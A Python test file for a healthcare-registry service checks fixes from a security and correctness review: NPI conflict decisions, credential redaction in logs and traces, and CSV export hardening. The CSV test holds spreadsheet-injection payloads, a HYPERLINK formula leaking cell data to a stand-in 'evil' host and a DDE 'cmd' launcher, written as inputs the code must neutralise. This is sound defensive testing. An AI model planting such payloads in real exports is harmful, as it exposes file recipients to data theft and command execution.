"""Corrections from the independent pre-merge review of 2026-09-16.

Each test names the review finding it closes. The DB tests reproduce the
reviewers' probes (A, A2, C, D) and assert the corrected behaviour; the pure
tests cover the redaction, exception-text, CSV and request-id fixes.
"""

from __future__ import annotations

import csv
import io
import logging

import pytest
from sqlalchemy import select

from app.core.logging_config import redact_text, safe_exception_text
from app.tefca_registry import models as reg
from app.tefca_registry.rce import curation, dispositions as disp
from app.tefca_registry.rce import identifier_decisions, traceability_models as tm
from app.tefca_registry.rce.promotion import promote_delivery
from rce_traceability_support import (  # noqa: F401
    NPI_BAD_CHECKSUM, NPI_REGISTERED, NPI_VALID_OTHER, SYN, active_npi_rows,
    curated_by_oid, issues_for, make_rows, rolled_back_db,
    run_quality_and_curation, seed_entity, seed_intake,
)

ANALYST = "analyst@example.test"
#: A third Luhn-valid synthetic NPI (base 123456780 -> check digit 7... computed
#: by make_valid_npi at import time below so the constant can never be wrong).
from app.services.npi_validator import make_valid_npi, validate_npi  # noqa: E402

NPI_THIRD = make_valid_npi("199999999")


async def _decision_events(db, entity_id, itype="npi"):
    return (await db.execute(
        select(tm.TefcaIdentifierDecisionEvent).where(
            tm.TefcaIdentifierDecisionEvent.entity_id == entity_id,
            tm.TefcaIdentifierDecisionEvent.identifier_type == itype)
        .order_by(tm.TefcaIdentifierDecisionEvent.sequence))).scalars().all()


async def _npi_state(db, entity_id):
    rows = (await db.execute(select(reg.TefcaEntityIdentifier).where(
        reg.TefcaEntityIdentifier.entity_id == entity_id,
        reg.TefcaEntityIdentifier.identifier_type == "npi"))).scalars().all()
    return {r.identifier_value: r.identifier_status for r in rows}


async def _conflict_setup(db, arc, *, submitted):
    """Registered NPI_REGISTERED; delivery submits `submitted`; promotion raises
    the conflict and holds the record. Returns (rows, entity_id, intake_id,
    curated, conflict_issue)."""
    rows = make_rows(1, arc=arc)
    rows[0]["NPI"] = submitted
    entity_id = await seed_entity(db, oid=rows[0]["id"], name=rows[0]["name"],
                                  npi=NPI_REGISTERED, tefcaid=rows[0]["TEFCAID"])
    intake_id, _job = await seed_intake(db, rows)
    await run_quality_and_curation(db, intake_id)
    curated = await curated_by_oid(db, intake_id, rows[0]["id"])
    await promote_delivery(db, intake_id, actor=SYN)
    await db.refresh(curated)
    assert curated.record_status == "HELD" and curated.canonical_entity_id is None
    conflict = (await issues_for(db, curated.source_record_id, rule_id="NPI-008"))[0]
    return rows, entity_id, intake_id, curated, conflict


# ── F1 / H-1: the decision gate ──────────────────────────────────────────────

async def test_a_decision_without_a_raised_conflict_is_refused(rolled_back_db):
    """F1: `decide` was a free-standing write to the registry. Now it answers a
    raised conflict or nothing."""
    db = rolled_back_db
    entity_id = await seed_entity(db, oid="9.99.777.61", name="No Conflict Org",
                                  npi=NPI_REGISTERED)
    with pytest.raises(identifier_decisions.NoOpenConflict):
        await identifier_decisions.decide(
            db, entity_id=entity_id, identifier_type="npi",
            decision="CONFIRM_SUBMITTED", reason="no conflict exists", actor=ANALYST,
            selected_value=NPI_VALID_OTHER)
    assert await _npi_state(db, entity_id) == {NPI_REGISTERED: "active"}
    assert await _decision_events(db, entity_id) == []


async def test_identifier_type_outside_the_vocabulary_is_refused(rolled_back_db):
    db = rolled_back_db
    entity_id = await seed_entity(db, oid="9.99.777.62", name="Vocab Org", npi=NPI_REGISTERED)
    with pytest.raises(ValueError, match="identifier_type must be one of"):
        await identifier_decisions.decide(
            db, entity_id=entity_id, identifier_type="bogus_type",
            decision="CONFIRM_SUBMITTED", reason="r", actor=ANALYST,
            selected_value="NOT-A-VALID-IDENTIFIER")
    rows = (await db.execute(select(reg.TefcaEntityIdentifier).where(
        reg.TefcaEntityIdentifier.entity_id == entity_id))).scalars().all()
    assert {r.identifier_type for r in rows} == {"rce_org_oid", "npi"}


async def test_confirm_submitted_cannot_choose_a_third_value(rolled_back_db):
    """Probe A2: `selected_value="NOT-AN-NPI"` became the active row."""
    db = rolled_back_db
    _rows, entity_id, _intake, _cur, _conf = await _conflict_setup(
        db, "9.99.777.63", submitted=NPI_VALID_OTHER)
    with pytest.raises(ValueError, match="CONFIRM_SUBMITTED confirms the submitted value"):
        await identifier_decisions.decide(
            db, entity_id=entity_id, identifier_type="npi", decision="CONFIRM_SUBMITTED",
            reason="r", actor=ANALYST, selected_value="NOT-AN-NPI")
    assert await _npi_state(db, entity_id) == {NPI_REGISTERED: "active"}


async def test_confirm_submitted_of_an_invalid_npi_is_refused_and_registry_unchanged(rolled_back_db):
    """Probe A (H-1): a checksum-invalid submitted value was written as the
    ACTIVE NPI and the registered one superseded. Refused now; the record stays
    HELD by both findings; the registry is untouched."""
    db = rolled_back_db
    _rows, entity_id, intake_id, curated, conflict = await _conflict_setup(
        db, "9.99.777.64", submitted=NPI_BAD_CHECKSUM)
    before = await _npi_state(db, entity_id)
    with pytest.raises(identifier_decisions.IdentifierValueRefused, match="not a valid NPI"):
        await curation.apply_disposition(
            db, conflict.id, decision="CONFIRM_SUBMITTED",
            reason="analyst believes the delivered value", actor=ANALYST)
    await db.rollback()
    assert await _npi_state(db, entity_id) == before == {NPI_REGISTERED: "active"}
    await db.refresh(curated)
    assert curated.record_status == "HELD"
    events = await _decision_events(db, entity_id)
    assert [e.decision for e in events] == ["CONFLICT_RAISED"]
    current = (await disp.current_for_intake(db, intake_id))[0]
    assert current["disposition"] == "HELD"


async def test_a_value_registered_to_another_entity_is_refused(rolled_back_db):
    db = rolled_back_db
    _rows, entity_id, _intake, _cur, conflict = await _conflict_setup(
        db, "9.99.777.65", submitted=NPI_VALID_OTHER)
    await seed_entity(db, oid="9.99.777.66", name="Other Org", npi=NPI_VALID_OTHER)
    with pytest.raises(identifier_decisions.IdentifierAlreadyRegistered):
        await curation.apply_disposition(
            db, conflict.id, decision="CONFIRM_SUBMITTED",
            reason="delivered value verified", actor=ANALYST)
    await db.rollback()
    assert await _npi_state(db, entity_id) == {NPI_REGISTERED: "active"}


async def test_corrected_writes_the_registry_and_does_not_reraise_the_conflict(rolled_back_db):
    """Probe C (M-2): CORRECT recorded an event, changed Area 2 only, and
    re-promotion raised the conflict again. CORRECTED now changes the registry
    (validated) and the re-promotion matches."""
    db = rolled_back_db
    _rows, entity_id, intake_id, curated, conflict = await _conflict_setup(
        db, "9.99.777.67", submitted=NPI_VALID_OTHER)

    out = await curation.apply_disposition(
        db, conflict.id, decision="CORRECT", corrected_value=NPI_THIRD,
        reason="NPPES shows the third value for this organisation", actor=ANALYST)

    assert out["registry_changed"] is True
    assert await _npi_state(db, entity_id) == {NPI_REGISTERED: "superseded", NPI_THIRD: "active"}
    events = await _decision_events(db, entity_id)
    assert [e.decision for e in events] == ["CONFLICT_RAISED", "CORRECTED"]
    assert events[-1].selected_value == NPI_THIRD
    await db.refresh(curated)
    assert curated.record_status in ("CORRECTED", "CLEAN"), curated.status_reason
    assert curated.canonical_entity_id == entity_id, "re-promoted after the decision"
    assert curated.npi == NPI_THIRD
    conflicts = await issues_for(db, curated.source_record_id, rule_id="NPI-008")
    assert len(conflicts) == 1, "no second conflict issue"
    versions = (await db.execute(select(reg.TefcaEntityVersion).where(
        reg.TefcaEntityVersion.entity_id == entity_id))).scalars().all()
    assert any(v.change_reason == "identifier_corrected" for v in versions)


async def test_corrected_with_an_invalid_value_is_refused(rolled_back_db):
    db = rolled_back_db
    _rows, entity_id, _intake, _cur, conflict = await _conflict_setup(
        db, "9.99.777.68", submitted=NPI_VALID_OTHER)
    with pytest.raises(identifier_decisions.IdentifierValueRefused):
        await curation.apply_disposition(
            db, conflict.id, decision="CORRECT", corrected_value=NPI_BAD_CHECKSUM,
            reason="typo", actor=ANALYST)
    await db.rollback()
    assert await _npi_state(db, entity_id) == {NPI_REGISTERED: "active"}


# ── M-1: a correction never releases a record something else holds ──────────

async def test_apply_correction_keeps_the_record_held_while_another_high_finding_is_open(rolled_back_db):
    """Probe D: transition -> APPROVED -> apply_correction set CORRECTED
    unconditionally, and promote_delivery then promoted the record past a
    second undecided HIGH finding."""
    db = rolled_back_db
    rows = make_rows(1, arc="9.99.777.69")
    rows[0]["NPI"] = NPI_BAD_CHECKSUM          # NPI-003 HIGH, HUMAN_REQUIRED
    rows[0]["sequoiaorgtype"] = "Bogus Type"    # REQ-001 HIGH, HUMAN_REQUIRED
    intake_id, _job = await seed_intake(db, rows)
    await run_quality_and_curation(db, intake_id)
    curated = await curated_by_oid(db, intake_id, rows[0]["id"])
    assert curated.record_status == "HELD"
    npi_issue = (await issues_for(db, curated.source_record_id, rule_id="NPI-003"))[0]
    other = (await issues_for(db, curated.source_record_id, rule_id="REQ-001"))[0]
    assert other.resolution == "OPEN"

    await curation.transition_issue(db, npi_issue.id, to_status="PROPOSED", actor=ANALYST)
    await curation.transition_issue(db, npi_issue.id, to_status="APPROVED", actor=ANALYST)
    out = await curation.apply_correction(db, npi_issue.id, actor=ANALYST,
                                          corrected_value=NPI_VALID_OTHER)
    assert out["corrected_value"] == NPI_VALID_OTHER
    await db.refresh(curated)
    assert curated.record_status == "HELD", curated.status_reason
    assert "still held" in (curated.status_reason or "")

    result = await promote_delivery(db, intake_id, actor=SYN)
    await db.refresh(curated)
    assert curated.canonical_entity_id is None, "not promoted past the open HIGH finding"
    current = (await disp.current_for_intake(db, intake_id))[0]
    assert current["disposition"] == "HELD"
    assert result.get("created", 0) == 0


async def test_apply_correction_refuses_an_invalid_npi(rolled_back_db):
    """L-1: a corrected NPI was not validated and silently skipped at promotion."""
    db = rolled_back_db
    rows = make_rows(1, arc="9.99.777.70")
    rows[0]["NPI"] = NPI_BAD_CHECKSUM
    intake_id, _job = await seed_intake(db, rows)
    await run_quality_and_curation(db, intake_id)
    curated = await curated_by_oid(db, intake_id, rows[0]["id"])
    npi_issue = (await issues_for(db, curated.source_record_id, rule_id="NPI-003"))[0]
    await curation.transition_issue(db, npi_issue.id, to_status="PROPOSED", actor=ANALYST)
    await curation.transition_issue(db, npi_issue.id, to_status="APPROVED", actor=ANALYST)
    with pytest.raises(curation.CorrectionRefused, match="not a valid NPI"):
        await curation.apply_correction(db, npi_issue.id, actor=ANALYST,
                                        corrected_value="1234567890")


# ── L-5: ASCII digits only ───────────────────────────────────────────────────

def test_npi_validator_rejects_non_ascii_digits():
    assert validate_npi("1982916078") == (True, "")
    ok, message = validate_npi("١٩٨٢٩١٦٠٧٨")
    assert ok is False and "digits" in message


# ── M5 / F3: redaction and controlled exception text ─────────────────────────

@pytest.mark.parametrize("raw, leaked", [
    ("client_secret=abc123XYZ", "abc123XYZ"),
    ("access_token=eyJabc.def", "eyJabc"),
    ("refresh_token=zzz-yyy", "zzz-yyy"),
    ("PASSWORD: hunter2", "hunter2"),
    ('"password": "hunter2"', "hunter2"),
    ("Authorization: Basic dXNlcjpwYXNz", "dXNlcjpwYXNz"),
    ("postgresql+asyncpg://user:S3cretPass@host/db", "S3cretPass"),
    ("token = abcdefgh", "abcdefgh"),
])
def test_redact_text_masks_every_probed_credential_form(raw, leaked):
    out = redact_text(raw)
    assert leaked not in out, out
    assert "[REDACTED]" in out


def test_redact_text_leaves_benign_text_alone():
    assert redact_text("sasl_mech=plain ok") == "sasl_mech=plain ok"
    assert redact_text("normal text = fine") == "normal text = fine"


def test_driver_exception_text_is_class_only_and_domain_text_is_redacted():
    from sqlalchemy.exc import IntegrityError
    exc = IntegrityError("INSERT INTO t VALUES (1982916078)", {"npi": "1982916078"},
                         Exception("DETAIL: Key (npi)=(1982916078) already exists"))
    text = safe_exception_text(exc)
    assert text.startswith("IntegrityError")
    assert "1982916078" not in text and "INSERT" not in text
    domain = safe_exception_text(ValueError("promotion declined: password=abc missing key"))
    assert domain == "ValueError: promotion declined: password=[REDACTED] missing key"


def test_stage_event_failure_reason_never_carries_sql_or_parameters():
    from sqlalchemy.exc import IntegrityError

    from app.tefca_registry.rce.stage_events import safe_failure_text
    exc = IntegrityError("UPDATE x SET npi=%s", {"npi": "1982916078"},
                         Exception("Key (identifier_type, identifier_value)=(npi, 1982916078)"))
    assert "1982916078" not in safe_failure_text(exc)


# ── F4 / L1: CSV formula neutralisation ──────────────────────────────────────

def test_csv_cells_that_look_like_formulas_are_neutralised():
    from app.reports.engine.csv_engine import neutralise_row
    from app.tefca_registry.rce.exception_ledger import DISPOSITION_CSV_COLUMNS, dispositions_csv

    row = {c: None for c in DISPOSITION_CSV_COLUMNS}
    row.update(curated_name='=HYPERLINK("http://evil/?"&A1,"open")', reason="+cmd|' /C calc'!A0",
               actor="@user", line_number=2)
    text = dispositions_csv([row])
    parsed = list(csv.reader(io.StringIO(text)))
    record = dict(zip(parsed[0], parsed[1]))
    assert record["curated_name"].startswith("'=")
    assert record["reason"].startswith("'+")
    assert record["actor"].startswith("'@")
    assert record["line_number"] == "2"
    assert neutralise_row(["-5", 7, "ok", "\tx"]) == ["'-5", 7, "ok", "'\tx"]


# ── M1: the request id survives an unhandled 500 ─────────────────────────────

def test_unhandled_500_carries_the_same_request_id_in_header_body_and_log(caplog):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from app.core.error_handler import register_exception_handlers
    from app.core.request_context import RequestContextMiddleware

    app = FastAPI()
    app.add_middleware(RequestContextMiddleware)
    register_exception_handlers(app)

    @app.get("/boom")
    async def boom():
        raise RuntimeError("password=hunter2 boom")

    client = TestClient(app, raise_server_exceptions=False)
    with caplog.at_level(logging.ERROR):
        r = client.get("/boom", headers={"X-Request-ID": "probe-500-request-0001"})
    assert r.status_code == 500
    assert r.headers.get("X-Request-ID") == "probe-500-request-0001"
    assert r.json()["request_id"] == "probe-500-request-0001"
    assert "hunter2" not in r.text
    assert any("probe-500-request-0001" in rec.getMessage() for rec in caplog.records)


# ── M3 / M4: telemetry exception events and exported logs are redacted ───────

def test_span_exception_event_carries_no_message_payload_or_stacktrace():
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.export import SimpleSpanProcessor
    from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
    from sqlalchemy.exc import IntegrityError

    from app.core import telemetry

    exporter = InMemorySpanExporter()
    provider = TracerProvider(sampler=telemetry.ErrorKeepingSampler(1.0))
    provider.add_span_processor(telemetry.RedactingSpanProcessor())
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    telemetry.use_tracer_provider(provider)
    try:
        with pytest.raises(IntegrityError):
            with telemetry.span("rce.stage.PROMOTION", job_id="job-9", stage="PROMOTION"):
                raise IntegrityError("INSERT INTO x VALUES (1982916078)",
                                     {"npi": "1982916078", "password": "hunter2"},
                                     Exception("DETAIL: Key (npi)=(1982916078)"))
        with pytest.raises(RuntimeError):
            with telemetry.span("report.generate", report_id="DA-1"):
                raise RuntimeError("connect failed: password=hunter2 for npi 1234567893")
    finally:
        telemetry.use_tracer_provider(None)
    spans = {s.name: s for s in exporter.get_finished_spans()}
    for span in spans.values():
        assert span.status.status_code.name == "ERROR"
        (event,) = span.events
        attrs = dict(event.attributes)
        assert event.name == "exception"
        assert "exception.stacktrace" not in attrs
        blob = str(attrs)
        assert "1982916078" not in blob and "hunter2" not in blob and "1234567893" not in blob
    assert attrs["exception.type"].endswith("RuntimeError")


def test_exported_log_records_are_redacted_and_carry_no_stacktrace():
    from opentelemetry.sdk._logs import LoggerProvider, LoggingHandler
    from opentelemetry.sdk._logs.export import InMemoryLogExporter, SimpleLogRecordProcessor

    from app.core import telemetry

    provider = LoggerProvider()
    provider.add_log_record_processor(telemetry.RedactingLogRecordProcessor())
    exporter = InMemoryLogExporter()
    provider.add_log_record_processor(SimpleLogRecordProcessor(exporter))
    handler = LoggingHandler(logger_provider=provider)
    log = logging.getLogger("docuaction.test.export")
    log.addHandler(handler)
    log.setLevel(logging.INFO)
    try:
        try:
            raise RuntimeError("connect failed: password=hunter2 client_secret=abc123 npi 1982916078")
        except RuntimeError:
            log.error("Unhandled: access_token=eyJxyz", extra={"api_key": "k123", "ok": "v"},
                      exc_info=True)
    finally:
        log.removeHandler(handler)
    (record,) = exporter.get_finished_logs()
    body = str(record.log_record.body)
    attrs = dict(record.log_record.attributes or {})
    blob = body + str(attrs)
    for leaked in ("hunter2", "abc123", "eyJxyz", "k123", "Traceback"):
        assert leaked not in blob, (leaked, blob)
    assert attrs.get("api_key") == "[REDACTED]"
    assert attrs.get("ok") == "v"
    assert "withheld" in str(attrs.get("exception.stacktrace", "withheld"))


# ── F2: startup create_all never creates the evidence tables ─────────────────

def test_startup_create_all_excludes_the_migration_owned_tables():
    from app.core.database import Base
    from app.core.schema_guard import create_all_except_migration_owned
    from app.tefca_registry.rce import traceability_models as tm

    assert set(tm.MIGRATION_OWNED_TABLES) <= set(Base.metadata.tables), \
        "the models must be on Base so Alembic autogenerate sees them"
    captured = {}

    class _Meta:
        sorted_tables = list(Base.metadata.sorted_tables)

        def create_all(self, conn, tables=None):
            captured["names"] = {t.name for t in tables}

    excluded = create_all_except_migration_owned(object(), _Meta())
    assert set(excluded) == set(tm.MIGRATION_OWNED_TABLES)
    assert not (captured["names"] & set(tm.MIGRATION_OWNED_TABLES))
    assert "rce_curated_records" in captured["names"]
